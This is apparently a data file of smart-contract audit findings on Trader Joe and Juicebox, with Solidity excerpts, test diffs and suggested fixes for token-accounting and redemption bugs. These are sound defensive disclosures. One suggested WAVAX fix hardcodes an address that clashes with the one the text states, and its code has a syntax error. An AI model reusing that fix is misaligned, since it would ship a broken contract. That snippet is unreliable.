[LBToken.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol)  **Description:** Order of Functions; ordering helps readers identify which functions they can call and to find the constructor and fallback definitions easier. But there are contracts in the project that do not comply with this.  https://docs.soliditylang.org/en/v0.8.17/style-guide.html  Functions should be grouped according to their visibility and ordered:  - constructor - receive function (if exists) - fallback function (if exists) - external - public - internal - private - within a grouping, place the\u00a0view\u00a0and\u00a0pure\u00a0functions last  ### [N-08] Compliance with Solidity Style rules in Constant expressions  **Context:** [LBToken.sol#L29](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L29) [LBToken.sol#L30](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L30)   **Recommendation:** Variables are declared as\u00a0constant\u00a0utilize the\u00a0UPPER_CASE_WITH_UNDERSCORES\u00a0format.  ### [N-09] Omissions in Events  Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters  The events should include the new value and old value where possible:  Events with no old value; [PendingOwnable.sol#L103](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L103)  ### [N-10] Need Fuzzing test  **Context:** 35 results - 9 files Project uncheckeds list:  ```js  39 results - 9 files  src/LBFactory.sol:   162:         unchecked {   190:         unchecked { src/LBPair.sol:   224:         unchecked {   273:         unchecked {   398:         unchecked {   495:         unchecked {   622:         unchecked {   694:         unchecked {   736:         unchecked {   793:         unchecked {   814:         unchecked {   887:         unchecked {   928:         unchecked { src/LBRouter.sol:   661:         unchecked {   777:         unchecked {   830:         unchecked {   877:         unchecked {   950:         unchecked { src/LBToken.sol:    89:          unchecked {   162:         unchecked {   189:         unchecked {   214:         unchecked {   239:         unchecked { src/libraries/BinHelper.sol:   23:           unchecked {   41:           unchecked {   54:           unchecked { src/libraries/BitMath.sol:    40:          unchecked {    57:          unchecked {    70:          unchecked {   109:         unchecked { src/libraries/FeeDistributionHelper.sol:   41:           unchecked {   54:           unchecked { src/libraries/Math128x128.sol:   46:          unchecked { src/libraries/Math512Bits.sol:    70:         unchecked {   129:        unchecked { ```  **Description:** In total 9 contracts, 39 unchecked are used, the functions used are critical. For this reason, there must be fuzzing tests in the tests of the project. Not seen in tests.  **Recommendation:** Use should fuzzing test like Echidna.  As Alberto Cuesta Canada said: _Fuzzing is not easy, the tools are rough, and the math is hard, but it is worth it. Fuzzing gives me a level of confidence in my smart contracts that I didn\u2019t have before. Relying just on unit testing anymore and poking around in a testnet seems reckless now._  https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05  ### [N-11] Use a more recent version of Solidity  **Context:** All contracts  **Description:** For security, it is best practice to use the latest Solidity version. For the security fix list in the versions; https://github.com/ethereum/solidity/blob/develop/Changelog.md   **Recommendation:** Old version of Solidity is used `(0.8.0)`, newer version can be used `(0.8.17)`  ### [N-12] Solidity compiler optimizations can be problematic  **Context:** [foundry.toml#L6](https://github.com/code-423n4/2022-10-traderjoe/blob/main/foundry.toml#L6)  ```js main/ foundry.toml#L6:  [profile.default] src = 'src' out = 'out' libs = ['lib'] optimizer = true optimizer_runs = 800 ```  **Description:** Protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them.   Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG.   Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.  Exploit Scenario A latent or future bug in Solidity compiler optimizations\u2014or in the Emscripten transpilation to solc-js\u2014causes a security vulnerability in the contracts.  **Recommendation:** Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.    ### [L-01] Use ```safeTransferOwnership``` instead of ```transferOwnership``` function  **Context:** [PendingOwnable.sol#L91-L95](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L91-L95)  **Description:** ```transferOwnership``` function is used to change Ownership  Use a 2 structure transferOwnership which is safer.  ```safeTransferOwnership```,  use it is more secure due to 2-stage ownership transfer.  **Recommendation:** Use ``Ownable2Step.sol`` [Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)  ```js  /**      * @dev The new owner accepts the ownership transfer.      */     function acceptOwnership() external {         address sender = _msgSender();         require(pendingOwner() == sender, \"Ownable2Step: caller is not the new owner\");         _transferOwnership(sender);     } } ``` ### [L-02] Owner can renounce Ownership  **Context:** [PendingOwnable.sol#L84](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L84)  **Description:** Typically, the contract\u2019s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.  The Trader Joe\u2019s\u00a0Ownable\u00a0used in\u00a0this project\u00a0contract implements\u00a0renounceOwnership. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.   `onlyOwner` functions; ```js 14 results - 2 files  src/LBFactory.sol:   220:     function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {   322:     ) external override onlyOwner {   355:     ) external override onlyOwner {   401:     function removePreset(uint16 _binStep) external override onlyOwner {   439:     ) external override onlyOwner {   473:     function setFeeRecipient(address _feeRecipient) external override onlyOwner {   479:     function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {   490:     function setFactoryLockedState(bool _locked) external override onlyOwner {   498:     function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {   507:     function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {   525:     function forceDecay(ILBPair _LBPair) external override onlyOwner {  src/libraries/PendingOwnable.sol:   59:     function setPendingOwner(address pendingOwner_) public override onlyOwner {   68:     function revokePendingOwner() public override onlyOwner {   84:     function renounceOwnership() public override onlyOwner {  ```  **Recommendation:** We recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design.  ### [L-03] Use a more recent version of OpenZeppelin dependencies  **Context:** All contracts  **Description:** For security, it is best practice to use the latest OZ version.  [package.json#L4](https://github.com/code-423n4/2022-10-traderjoe/blob/main/lib/openzeppelin-contracts/package.json#L4)  ```js \"name\": \"openzeppelin-solidity\",   \"description\": \"Secure Smart Contract library for Solidity\",   \"version\": \"4.6.0\", ```  For the security fix list in the versions; https://github.com/ethereum/solidity/blob/develop/Changelog.md   **Recommendation:** Old version of OZ is used `(4.6.0)`, newer version can be used `(4.7.3)`   https://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.3   ### [L-04] WAWAX address definition can be use directly  **Context:** [LBRouter.sol#L59](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L59)  **Description:** Wawax is a wrap avax contract with a specific address in the Avalanche network, giving the option to define it may cause false recognition, it is healthier to define it directly.  Advantages of defining a specific contract directly: - It saves gas  - Prevents incorrect argument definition  - Prevents execution on a different chain and re-signature issues  WAWAX Address : 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7  ```js constructor(         ILBFactory _factory,         IJoeFactory _oldFactory,         IWAVAX _wavax     ) {         factory = _factory;         oldFactory = _oldFactory;         wavax = _wavax;     } ```  **Recommendation:** ```js address private constant wavax = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;  constructor(         ILBFactory _factory,         IJoeFactory _oldFactory,      ) {         factory = _factory;         oldFactory = _oldFactory;     } ```   ### [L-05] 2 step changes for privileged contract addresses  **Context:** https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L468   **Description:** Some contracts in the project have setters for privileged addresses that control the contract logic, such as the keeper.It would be best to do a two step change for those addresses.  First, nominate the address, and second accept the nomination from that address ensuring that the access is indeed secured  ``` src/LBFactory.sol:   530:     function setFeeRecipient(address _feeRecipient) external override onlyOwner {   531          _setFeeRecipient(_feeRecipient); ```  **Recommendation:**  ```js ///  _feeRecipient will only be changed if the new _feeRecipient accepts it. It will be pending till then. function setFeeRecipient(address _feeRecipient) external override onlyOwner {     pendingFeeRecipient = _feeRecipient; }  function acceptFeeRecipient() public {     require(msg.sender == pendingFeeRecipient, \"INVALID_ADDRESS\");     _setFeeRecipient(pendingFeeRecipient); } ```   ### [S-01] Add to _blacklist function_  **Description:** Cryptocurrency mixing service, Tornado Cash, has been blacklisted in the OFAC. A lot of blockchain companies, token projects, NFT Projects have ```blacklisted``` all Ethereum addresses owned by Tornado Cash listed in the US Treasury Department's sanction against the protocol. https://home.treasury.gov/policy-issues/financial-sanctions/recent-actions/20220808  Some of these Projects;  - USDC   - Aave   - Uniswap  - Balancer  - Infura  - Alchemy   - Opensea  - dYdX   For this reason, every project in the Avalanche network must have a blacklist function, this is a good method to avoid legal problems in the future, apart from the current need.  Transactions from the project by an account funded by Tonadocash or banned by OFAC can lead to legal problems.Especially American citizens may want to get addresses to the blackl"}, {"title": "beforeTokenTransfer called with wrong parameters in LBToken._burn", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "M-02"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/37258d595d596c195507234f795fa34e319b0a68/src/LBToken.sol#L237   # Vulnerability details  ## Impact In `LBToken._burn`, the `_beforeTokenTransfer` hook is called with `from = address(0)` and `to = _account`: ```solidity _beforeTokenTransfer(address(0), _account, _id, _amount); ``` Through a lucky coincidence, it turns out that this in the current setup does not cause a high severity issue. `_burn` is always called with `_account = address(this)`, which means that `LBPair._beforeTokenTransfer` is a NOP. However, this wrong call is very dangerous for future extensions or protocol that built on top of the protocol / fork it.  ## Proof Of Concept Let's say the protocol is extended with some logic that needs to track mints / burns. The canonical way to do this would be: ```solidity function _beforeTokenTransfer(         address _from,         address _to,         uint256 _id,         uint256 _amount     ) internal override(LBToken) {  if (_from == address(0)) {   // Mint Logic  } else if (_to == address(0)) {   // Burn Logic  } } ``` Such an extension would break, which could lead to loss of funds or a bricked system.  ## Recommended Mitigation Steps Call the hook correctly: ```solidity _beforeTokenTransfer(_account, address(0), _id, _amount); ```"}, {"title": "LBRouter.removeLiquidity returning wrong values", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "M-01"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/e81b78ddb7cc17f0ece921fbaef2c2521727094b/src/LBRouter.sol#L291   # Vulnerability details  ## Impact `LBRouter.removeLiquidity` reorders tokens when the user did not pass them in the pair order (ascending order): ```solidity if (_tokenX != _LBPair.tokenX()) {             (_tokenX, _tokenY) = (_tokenY, _tokenX);             (_amountXMin, _amountYMin) = (_amountYMin, _amountXMin); } ``` However, when returning `amountX` and `amountY`, it is ignored if the order was changed: ```solidity (amountX, amountY) = _removeLiquidity(_LBPair, _amountXMin, _amountYMin, _ids, _amounts, _to); ``` Therefore, when the order of the tokens is swapped by the function, the return value `amountX` (\"Amount of token X returned\") in reality is the amount of the user-provided token Y that is returned and vice versa.  Because this is an exposed function that third-party protocols / contracts will use, this can cause them to malfunction. For instance, when integrating with Trader Joe, something natural to do is: ``` (uint256 amountAReceived, uint256 amountBReceived) = LBRouter.removeLiquidity(address(tokenA), address(tokenB), ...); contractBalanceA += amountAReceived; contractBalanceB += amountBReceived; ``` This snippet will only be correct when the token addresses are passed in the right order, which should not be the case. When they are not passed in the right order, the accounting of third-party contracts will be messed up, leading to vulnerabilities / lost funds there.  ## Proof Of Concept First consider the following diff, which shows a scenario when `LBRouter` does not switch `tokenX` and `tokenY`, resulting in correct return values: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,7 +57,9 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token6D,              token18D,              DEFAULT_BIN_STEP, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountFirstRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountSecondRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test passes (as it should). Now, consider the following diff, where `LBRouter` switches `tokenX` and `tokenY`: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,12 +57,14 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( -            token6D, +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token18D, +            token6D,              DEFAULT_BIN_STEP, -            totalXbalance,              totalYBalance, +            totalXbalance,              ids,              amounts,              DEV, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountSecondRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountFirstRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test should also pass (the order of the tokens was only switched), but it does not because the return values are mixed up.  ## Recommended Mitigation Steps Add the following statement in the end: ```solidity if (_tokenX != _LBPair.tokenX()) {  return (amountY, amountX); } ```"}, {"title": "The tier reserved rate is not validated and can surpass `JBConstants.MAX_RESERVED_RATE`", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/201", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "satisfactory", "selected for report", "M-08"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1224-L1259 https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L566 https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L142   # Vulnerability details  If the reserved rate of a tier is set to a value > `JBConstants.MAX_RESERVED_RATE`, the `JBTiered721DelegateStore._numberOfReservedTokensOutstandingFor` function will return way more outstanding reserved tokens (up to ~6 times more than allowed - **2^16 - 1** due to the manual cast of `reservedRate` to `uint16` divided by `JBConstants.MAX_RESERVED_RATE = 10_000`). This inflated value is used in the `JBTiered721DelegateStore.totalRedemptionWeight` function to calculate the cumulative redemption weight of all tokens across all tiers.  This higher-than-expected redemption weight will lower the `reclaimAmount` calculated in the `JB721Delegate.redeemParams` function. Depending on the values of `_data.overflow` and `_redemptionWeight`, the calculated `reclaimAmount` can be **0** (due to rounding down, [see here](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L142)) or a smaller than anticipated value, leading to burned NFT tokens from the user and no redemptions.  ## Impact  The owner of an NFT contract can add tiers with higher than usual reserved rates (and mint an appropriate number of NFTs to bypass all conditions in the `JBTiered721DelegateStore._numberOfReservedTokensOutstandingFor`), which will lead to a lower-than-expected redemption amount for users.  ## Proof of Concept  [JBTiered721DelegateStore.\\_numberOfReservedTokensOutstandingFor](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1224-L1259)  ```solidity function _numberOfReservedTokensOutstandingFor(   address _nft,   uint256 _tierId,   JBStored721Tier memory _storedTier ) internal view returns (uint256) {   // Invalid tier or no reserved rate?   if (_storedTier.initialQuantity == 0 || _storedTier.reservedRate == 0) return 0;    // No token minted yet? Round up to 1.   if (_storedTier.initialQuantity == _storedTier.remainingQuantity) return 1;    // The number of reserved tokens of the tier already minted.   uint256 _reserveTokensMinted = numberOfReservesMintedFor[_nft][_tierId];    // If only the reserved token (from the rounding up) has been minted so far, return 0.   if (_storedTier.initialQuantity - _reserveTokensMinted == _storedTier.remainingQuantity)     return 0;    // Get a reference to the number of tokens already minted in the tier, not counting reserves or burned tokens.   uint256 _numberOfNonReservesMinted = _storedTier.initialQuantity -     _storedTier.remainingQuantity -     _reserveTokensMinted;    // Store the numerator common to the next two calculations.   uint256 _numerator = uint256(_numberOfNonReservesMinted * _storedTier.reservedRate);    // Get the number of reserved tokens mintable given the number of non reserved tokens minted. This will round down.   uint256 _numberReservedTokensMintable = _numerator / JBConstants.MAX_RESERVED_RATE;    // Round up.   if (_numerator - JBConstants.MAX_RESERVED_RATE * _numberReservedTokensMintable > 0)     ++_numberReservedTokensMintable;    // Return the difference between the amount mintable and the amount already minted.   return _numberReservedTokensMintable - _reserveTokensMinted; } ```  [JBTiered721DelegateStore.totalRedemptionWeight](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L566)  The `JBTiered721DelegateStore._numberOfReservedTokensOutstandingFor` function is called from within the `JBTiered721DelegateStore.totalRedemptionWeight` function. This allows for inflating the total redemption weight.  ```solidity function totalRedemptionWeight(address _nft) public view override returns (uint256 weight) {   // Keep a reference to the greatest tier ID.   uint256 _maxTierId = maxTierIdOf[_nft];    // Keep a reference to the tier being iterated on.   JBStored721Tier memory _storedTier;    // Add each token's tier's contribution floor to the weight.   for (uint256 _i; _i < _maxTierId; ) {     // Keep a reference to the stored tier.     _storedTier = _storedTierOf[_nft][_i + 1];      // Add the tier's contribution floor multiplied by the quantity minted.     weight +=       (_storedTier.contributionFloor *         (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +       _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier);      unchecked {       ++_i;     }   } } ```  [JBTiered721Delegate.\\_totalRedemptionWeight](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721Delegate.sol#L712)  `JBTiered721DelegateStore.totalRedemptionWeight` is called in the `JBTiered721Delegate._totalRedemptionWeight` function.  ```solidity function _totalRedemptionWeight() internal view virtual override returns (uint256) {   return store.totalRedemptionWeight(address(this)); } ```  [abstract/JB721Delegate.redeemParams](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L139)  This `JBTiered721Delegate._totalRedemptionWeight` function is then called in the `JB721Delegate.redeemParams` function, which ultimately calculates the `reclaimAmount` given an overflow and `_decodedTokenIds`.  `uint256 _base = PRBMath.mulDiv(_data.overflow, _redemptionWeight, _total);` in [line 142](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L142) will lead to a lower `_base` due to the inflated denumerator `_total`.  ```solidity function redeemParams(JBRedeemParamsData calldata _data)   external   view   override   returns (     uint256 reclaimAmount,     string memory memo,     JBRedemptionDelegateAllocation[] memory delegateAllocations   ) {   // Make sure fungible project tokens aren't being redeemed too.   if (_data.tokenCount > 0) revert UNEXPECTED_TOKEN_REDEEMED();    // Check the 4 bytes interfaceId and handle the case where the metadata was not intended for this contract   if (     _data.metadata.length < 4 || bytes4(_data.metadata[0:4]) != type(IJB721Delegate).interfaceId   ) {     revert INVALID_REDEMPTION_METADATA();   }    // Set the only delegate allocation to be a callback to this contract.   delegateAllocations = new JBRedemptionDelegateAllocation[](1);   delegateAllocations[0] = JBRedemptionDelegateAllocation(this, 0);    // If redemption rate is 0, nothing can be reclaimed from the treasury   if (_data.redemptionRate == 0) return (0, _data.memo, delegateAllocations);    // Decode the metadata   (, uint256[] memory _decodedTokenIds) = abi.decode(_data.metadata, (bytes4, uint256[]));    // Get a reference to the redemption rate of the provided tokens.   uint256 _redemptionWeight = _redemptionWeightOf(_decodedTokenIds);    // Get a reference to the total redemption weight.   uint256 _total = _totalRedemptionWeight(); // @audit-info Uses the inflated total redemption weight    // Get a reference to the linear proportion.   uint256 _base = PRBMath.mulDiv(_data.overflow, _redemptionWeight, _total);    // These conditions are all part of the same curve. Edge conditions are separated because fewer operation are necessary.   if (_data.redemptionRate == JBConstants.MAX_REDEMPTION_RATE)     return (_base, _data.memo, delegateAllocations);    // Return the weighted overflow, and this contract as the delegate so that tokens can be deleted.   return (     PRBMath.mulDiv(       _base,       _data.redemptionRate +         PRBMath.mulDiv(           _redemptionWeight,           JBConstants.MAX_REDEMPTION_RATE - _data.redemptionRate,           _total         ),       JBConstants.MAX_REDEMPTION_RATE     ),     _data.memo,     delegateAllocations   ); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider validating the tier reserved rate `reservedRate` in the `JBTiered721DelegateStore.recordAddTiers` function to ensure the reserved rate is not greater than `JBConstants.MAX_RESERVED_RATE`. "}, {"title": "Redemption weight of tiered NFTs miscalculates, making users redeem incorrect amounts - Bug #1", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/193", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-05"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L566   # Vulnerability details  ## Description  Redemption weight is a concept used in Juicebox to determine investor's eligible percentage of the non-locked funds. In redeemParams, JB721Delegate calculates user's share using:  ``` uint256 _redemptionWeight = _redemptionWeightOf(_decodedTokenIds); uint256 _total = _totalRedemptionWeight(); uint256 _base = PRBMath.mulDiv(_data.overflow, _redemptionWeight, _total); ```  _totalRedemptionWeight eventually is implemented in DelegateStore:  ``` for (uint256 _i; _i < _maxTierId; ) {   // Keep a reference to the stored tier.   _storedTier = _storedTierOf[_nft][_i + 1];   // Add the tier's contribution floor multiplied by the quantity minted.   weight +=     (_storedTier.contributionFloor *       (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +     _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier);   unchecked {     ++_i;   } } ```  If we pay attention to _numberOfReservedTokensOutstandingFor() call, we can see it is called with tierId = i, yet storedTier of i+1. It is definitely not the intention as for example, recordMintReservesFor() uses the function correctly:  ``` function recordMintReservesFor(uint256 _tierId, uint256 _count)   external   override   returns (uint256[] memory tokenIds) {   // Get a reference to the tier.   JBStored721Tier storage _storedTier = _storedTierOf[msg.sender][_tierId];   // Get a reference to the number of reserved tokens mintable for the tier.   uint256 _numberOfReservedTokensOutstanding = _numberOfReservedTokensOutstandingFor(     msg.sender,     _tierId,     _storedTier   );   ... ```  The impact of this bug is incorrect calculation of the weight of user's contributions. The\u00a0`initialQuantity` and\u00a0`remainingQuantity` values are taken from the correct tier, but\u00a0`_reserveTokensMinted` minted is taken from previous tier. In the case where\u00a0`_reserveTokensMinted` is smaller than correct value, for example tierID=0 which is empty, the outstanding value returned is larger, meaning weight is larger and redemptions are worth less. In the opposite case, where lower tierID has higher `_reserveTokensMinted`, the redemptions will receive\u00a0*more* payout than they should.  ## Impact  Users of projects can receive less or more funds than they are eligible for when redeeming NFT rewards.  ## Proof of Concept  1\\. Suppose we have a project with 2 tiers, reserve ratio = 50%, redemption ratio = 100%:  |     |     |     |     |     |     | | --- | --- | --- | --- | --- | --- | | Tier | Contribution | Initial quantity | Remaining quantity | Reserves minted | Reserves outstanding | | Tier 1 | 50  | 10  | 3   | 1   | 2   | | Tier 2 | 100 | 30  | 2   | 8   | 2   |  When calculating totalRedemptionWeight(), the correct result is  50 * (10 - 3) + 2 + 100 * (30-2) + 2 = 3154  The wrong result will be:  50 * (10 -3) + **4** \\+ 100 * (30-2) + **13**\u00a0 = 3167  Therefore, when users redeem NFT rewards, they will get less value than they are eligible for. Note that totalRedemptionWeight() has an\u00a0*additional* bug where the reserve amount is not multiplied by the contribution, which is discussed in another submission. If it would be calculated correctly, the correct weight would be 3450.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Change the calculation to:  ``` _numberOfReservedTokensOutstandingFor(_nft, _i+1, _storedTier); ```  ## Additional discussion  Likelihood of impact is very high, because the conditions will arise naturally (different tiers, different reserve minted count for each tier, user calls redeem).\u00a0 Severity of impact is high because users receive less or more tokens than they are eligible for.  Initially I thought this bug could allow attacker to steal entire unlocked project funds, using a mint/burn loop. However, this would not be profitable because their calculated share of the funds would always be at most what they put in, because reserve tokens are printed out of thin air."}, {"title": "Outstanding reserved tokens are incorrectly counted in total redemption weight", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/129", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "sponsor confirmed", "upgraded by judge", "selected for report", "H-03"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L563-L566   # Vulnerability details  ## Impact The amounts redeemed in overflow redemption can be calculated incorrectly due to incorrect accounting of the outstanding number of reserved tokens. ## Proof of Concept Project contributors are allowed to redeem their NFT tokens for a portion of the overflow (excessive funded amounts). The amount a contributor receives is calculated as [overflow * (user's redemption rate / total redemption weight)](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/abstract/JB721Delegate.sol#L135-L142), where user's redemption weight is [the total contribution floor of all their NFTs](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L532-L539) and total redemption weight is [the total contribution floor of all minted NFTs](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L563-L566). Since the total redemption weight is the sum of individual contributor redemption weights, the amount they can redeem is proportional to their contribution.  However, the total redemption weight calculation incorrectly accounts outstanding reserved tokens ([JBTiered721DelegateStore.sol#L563-L566](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L563-L566)): ```solidity // Add the tier's contribution floor multiplied by the quantity minted. weight +=   (_storedTier.contributionFloor *     (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +   _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier); ``` Specifically, the *number* of reserved tokens is added to the *weight* of minted tokens. This disrupts the redemption amount calculation formula since the total redemption weight is in fact not the sum of individual contributor redemption weights. ## Tools Used Manual review ## Recommended Mitigation Steps Two options can be seen: 1. if the outstanding number of reserved tokens is considered minted (which seems to be so, judging by [this logic](https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1058-L1063)) then it needs to be added to the quantity, i.e.:     ```diff     --- a/contracts/JBTiered721DelegateStore.sol     +++ b/contracts/JBTiered721DelegateStore.sol     @@ -562,8 +562,7 @@ contract JBTiered721DelegateStore is IJBTiered721DelegateStore {           // Add the tier's contribution floor multiplied by the quantity minted.           weight +=             (_storedTier.contributionFloor *     -          (_storedTier.initialQuantity - _storedTier.remainingQuantity)) +     -        _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier);     +          (_storedTier.initialQuantity - _storedTier.remainingQuantity +     +           _numberOfReservedTokensOutstandingFor(_nft, _i, _storedTier)));            unchecked {             ++_i;     ``` 1. if it's not considered minted, then it shouldn't be counted at all."}, {"title": "Minting and redeeming will break for fully minted tiers with reserveRate != 0 and reserveRate/MaxReserveRate tokens burned", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/113", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "satisfactory", "edited-by-warden", "selected for report", "H-02"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/f9893b1497098241dd3a664956d8016ff0d0efd0/contracts/JBTiered721DelegateStore.sol#L1224-L1259   # Vulnerability details  ## Impact  Minting and redeeming become impossible  ## Proof of Concept      uint256 _numberOfNonReservesMinted = _storedTier.initialQuantity -       _storedTier.remainingQuantity -       _reserveTokensMinted;      uint256 _numerator = uint256(_numberOfNonReservesMinted * _storedTier.reservedRate);      uint256 _numberReservedTokensMintable = _numerator / JBConstants.MAX_RESERVED_RATE;      if (_numerator - JBConstants.MAX_RESERVED_RATE * _numberReservedTokensMintable > 0)       ++_numberReservedTokensMintable;      return _numberReservedTokensMintable - _reserveTokensMinted;  The lines above are taken from JBTiered721DelegateStore#_numberOfReservedTokensOutstandingFor and used to calculate and return the available number of reserve tokens that can be minted. Since the return statement doesn't check that _numberReservedTokensMintable >= _reserveTokensMinted, it will revert under those circumstances. The issue is that there are legitimate circumstances in which this becomes false. If a tier is fully minted then all reserve tokens are mintable. When the tier begins to redeem, _numberReservedTokensMintable will fall under _reserveTokensMinted, permanently breaking minting and redeeming. Minting is broken because all mint functions 